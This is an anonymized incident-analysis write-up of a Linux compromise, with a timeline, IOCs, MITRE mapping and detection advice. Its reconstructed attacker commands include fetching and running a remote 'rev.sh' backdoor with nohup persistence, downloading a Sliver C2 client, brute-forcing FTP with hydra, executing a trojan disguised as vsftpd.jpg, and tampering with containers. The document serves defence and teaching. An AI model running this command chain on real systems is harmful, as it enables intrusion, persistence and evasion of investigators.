ğŸ›¡ Demo Case: Multi-Stage Compromise (Anonymized)
ğŸ“Œ Executive Summary

This case shows a multi-stage compromise across two Linux servers (10.0.0.7 and 10.0.0.6).
The attacker first created unauthorized accounts and deployed Sliver C2 on Host A.
They then brute-forced FTP on Host B, pivoted via SSH, deployed a custom backdoor (UPSET_RHYTHM), executed a disguised Trojan (vsftpd.jpg), and attempted anti-forensics with container tampering (runc delete --force).

ğŸ¯ Outcome: confirmed C2 activity, lateral movement, brute-force credential abuse, persistence, and cleanup attempts.

___________________________________________________________________________________________________________________________________________________


ğŸ–¼ Attack Flow (ASCII Diagram)

                   +-------------------+
                   |  External Attacker|
                   +-------------------+
                            |
                            v
                   +-------------------+
                   | Host A (10.0.0.7) |
                   +-------------------+
                      |         |
       curl Sliver    |         | hydra brute-force FTP
         +            |         v
         |            |   +-------------------+
         |            |   | Host B (10.0.0.6) |
         |            |   +-------------------+
         |            |           |
         |            |           â”œâ”€â”€ ğŸŸ¢ nohup ./UPSET_RHYTHM & (persistence)
         |            |           â”œâ”€â”€ ğŸ”´ exec ./vsftpd.jpg (Trojan)
         |            |           â”œâ”€â”€ ğŸŸ¡ gobuster dir â€¦ (recon)
         |            |           â””â”€â”€ ğŸŸ¡ runc delete --force (tampering)
         |
   Unauthorized user (ubuntu)
   Sliver C2 channel established
   SSH pivot as cooluser

___________________________________________________________________________________________________________________________________________________


ğŸ“– Attack Narrative

ğŸ¥· Stage 1 â€“ Foothold on Host A (10.0.0.7)

ğŸ”´ useradd ubuntu â†’ unauthorized user creation.

ğŸ”´ curl -sL â€¦ sliver-client_linux â†’ downloaded Sliver C2.

ğŸ”´ chmod +x sliver-client_linux â†’ execution prepared.

ğŸ”´ Sliver C2 beacon established (IP: 8.19.235.12).


ğŸ›  Stage 2 â€“ Credential Access & Pivot

ğŸŸ¡ hydra -l root -P 10k-most-common.txt ftp://10.0.0.6 â†’ brute-force against FTP.

ğŸŸ¡ SSH pivot â†’ first activity as cooluser on 10.0.0.6.


ğŸ’¥ Stage 3 â€“ Post-Exploitation on Host B (10.0.0.6)

ğŸŸ¢ curl -s http://files.hey/rev.sh -o UPSET_RHYTHM.

ğŸŸ¢ chmod +x ./UPSET_RHYTHM && nohup ./UPSET_RHYTHM &.

ğŸ”´ chmod +x ./vsftpd.jpg && ./vsftpd.jpg â†’ Trojan executed (SHA256: df49bf53747253c382de544fdf4f2fd17b586acc17cb81cf4c4168c535322609).

ğŸŸ¡ gobuster dir -u http://localhost â€¦ â†’ recon of internal service.

ğŸŸ¡ runc delete --force â†’ container tampering / anti-forensics.
---

___________________________________________________________________________________________________________________________________________________


â±ï¸ Timeline (UTC)


| Time (UTC) | Event                                                              |
| ---------- | ------------------------------------------------------------------ |
| 19:08:32   | ğŸ”´ `useradd ubuntu` (10.0.0.7)                                     |
| 19:10:04   | ğŸ”´ `curl` download sliver-client\_linux                            |
| 19:13:17   | ğŸ”´ `chmod +x sliver-client_linux`                                  |
| 19:17:51   | ğŸŸ¡ `runc delete --force` executed on 10.0.0.6 by root              |
| 19:24:52   | ğŸŸ¡ Hydra brute-force FTP attempt from 10.0.0.7 â†’ 10.0.0.6          |
| 19:49:35   | ğŸŸ¡ First command observed from user `cooluser` on 10.0.0.6         |
| 19:58:12   | ğŸŸ¢ root curl â†’ download `UPSET_RHYTHM`                             |
| 19:58:32   | ğŸŸ¢ `chmod +x ./UPSET_RHYTHM`                                       |
| 19:59:03   | ğŸŸ¢ `nohup ./UPSET_RHYTHM &`                                        |
| 20:03:37   | ğŸ”´ `chmod +x ./vsftpd.jpg`                                         |
| 20:03:38   | ğŸ”´ `./vsftpd.jpg` executed (Trojan, VirusTotal: 30+ AV detections) |
| 20:04:01   | ğŸŸ¡ `gobuster dir -u http://localhost â€¦`                            |

___________________________________________________________________________________________________________________________________________________


ğŸ“‚ Artifacts (Synthetic / Anonymized)


Host A (10.0.0.7 â€“ Initial C2):

{
  "time": "2025-07-14T19:10:04Z",
  "user": "root",
  "process": "curl -sL https://github.com/.../sliver-client_linux -o sliver-client_linux",
  "srcIP": "8.19.235.12"
}

Host B (10.0.0.6 â€“ UPSET_RHYTHM):

{
  "time": "2025-07-14T19:59:03Z",
  "user": "root",
  "process": "nohup ./UPSET_RHYTHM &",
  "cwd": "/tmp",
  "persistence": true
}

Malware Execution:

{
  "time": "2025-07-14T20:03:38Z",
  "user": "root",
  "file": "vsftpd.jpg",
  "sha256": "df49bf53747253c382de544fdf4f2fd17b586acc17cb81cf4c4168c535322609",
  "detection": "Trojan.Sliver (30+ AV engines)"
}

Recon (Gobuster):

{
  "time": "2025-07-14T20:04:01Z",
  "user": "root",
  "command": "gobuster dir -u http://localhost -w /usr/share/wordlists/",
  "target": "local web service"
}

___________________________________________________________________________________________________________________________________________________


ğŸ’» Attacker Commands (Reconstructed, Synthetic)


# ğŸŸ¡ Foothold
useradd ubuntu
curl -sL https://github.com/BishopFox/sliver/releases/download/v1.5.30/sliver-client_linux -o sliver-client_linux
chmod +x sliver-client_linux

# ğŸŸ¡ Credential Access
hydra -l root -P 10k-most-common.txt ftp://10.0.0.6

# ğŸŸ¢ Lateral Pivot (SSH as cooluser)
ssh cooluser@10.0.0.6

# ğŸŸ¢ Payload & Persistence
curl -s http://files.hey/rev.sh -o UPSET_RHYTHM
chmod +x ./UPSET_RHYTHM
nohup ./UPSET_RHYTHM &

# ğŸ”´ Malware Execution
chmod +x ./vsftpd.jpg
./vsftpd.jpg

# ğŸŸ¡ Recon & Anti-Forensics
gobuster dir -u http://localhost -w /usr/share/wordlists/
runc delete --force

___________________________________________________________________________________________________________________________________________________


ğŸ§¾ IOCs (Synthetic)

| Type       | Value                                                                                 | Source        | Status      |
| ---------- | ------------------------------------------------------------------------------------- | ------------- | ----------- |
| ğŸŒ IP      | 8.19.235.12                                                                           | Host A logs   | C2 / Sliver |
| ğŸ‘¤ Users   | ubuntu, cooluser                                                                      | Syslog / Auth | Rogue       |
| ğŸ›  Binary  | sliver-client\_linux                                                                  | File artifact | Malicious   |
| ğŸ›  Binary  | vsftpd.jpg (SHA256: df49bf53747253c382de544fdf4f2fd17b586acc17cb81cf4c4168c535322609) | VirusTotal    | Trojan      |
| âš™ï¸ Tooling | curl, chmod, hydra, runc, gobuster                                                    | Process logs  | Abused      |
| Script     | UPSET\_RHYTHM (downloaded from [http://files.hey/rev.sh](http://files.hey/rev.sh))    | Root activity | Malicious   |

___________________________________________________________________________________________________________________________________________________


ğŸ”‘ Key Findings


ğŸ”´ Foothold: unauthorized users (ubuntu, cooluser).

ğŸ”´ C2: Sliver client retrieved & prepared.

ğŸŸ¡ Brute-force: hydra FTP attempts.

ğŸŸ¡ Pivot: SSH access as cooluser.

ğŸŸ¢ Persistence: UPSET_RHYTHM + nohup.

ğŸ”´ Malware: Trojan disguised as vsftpd.jpg.

ğŸŸ¡ Recon: gobuster enumeration.

ğŸŸ¡ Tampering: runc delete --force (container cleanup).

___________________________________________________________________________________________________________________________________________________


ğŸ—‚ï¸ MITRE ATT&CK Mapping


T1136 â€“ Create Account (ubuntu, cooluser)

T1110 â€“ Brute Force (hydra)

T1021.004 â€“ SSH (pivot)

T1059 â€“ Command Shell (sliver-client_linux execution)

T1053 â€“ Scheduled/Background Task (nohup persistence)

T1071 â€“ Application Layer Protocol (Sliver C2)

T1046 â€“ Network Service Scanning (gobuster)

T1070/T1562 â€“ Indicator Removal / Impair Defenses (runc delete)

___________________________________________________________________________________________________________________________________________________


ğŸ‘€ Detection Use Cases


ğŸš¨ Alert on unexpected useradd by root.

ğŸš¨ Detect curlâ†’chmodâ†’exec chain in /tmp.

ğŸŸ¡ Flag hydra brute-force attempts.

ğŸŸ¡ Monitor SSH logins by new accounts (e.g., cooluser).

ğŸ”´ Detect suspicious binaries (sliver*, vsftpd.jpg).

ğŸŸ¡ Monitor container lifecycle events (runc delete --force).

___________________________________________________________________________________________________________________________________________________

ğŸ›¡ï¸ Recommendations


Block known IOCs (hashes, IP 8.19.235.12).

Enforce MFA & disable password auth for SSH.

Deploy auditd for execve, useradd, container commands.

Segment access between services (FTP/SSH).

Add SIEM hunts for Sliver/UPSET_RHYTHM patterns.

Review persistence attempts with nohup/background jobs.
